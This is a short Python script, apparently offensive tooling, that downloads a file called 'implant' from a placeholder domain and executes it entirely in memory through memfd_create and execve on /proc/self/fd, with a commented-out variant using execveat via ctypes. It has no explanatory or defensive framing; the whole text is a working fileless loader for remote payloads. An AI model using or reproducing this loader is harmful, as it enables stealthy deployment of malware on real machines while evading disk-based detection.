import urllib.request, os, ctypes

IMPLANT_URL = "https://<DOMAIN>/implant"

data = urllib.request.urlopen(IMPLANT_URL).read()
fd = os.memfd_create('', 0)
os.write(fd, data)

# Don't close fd - we need it for the path
os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], {})
"""
data = urllib.request.urlopen(IMPLANT_URL).read()
fd = os.memfd_create('', 0)
os.write(fd, data)
libc = ctypes.CDLL("libc.so.6")
result = libc.execveat(fd, b"", None, None, 0x1000)

print(f"execveat failed with result: {result}")
print(f"errno: {ctypes.get_errno()}")
"""
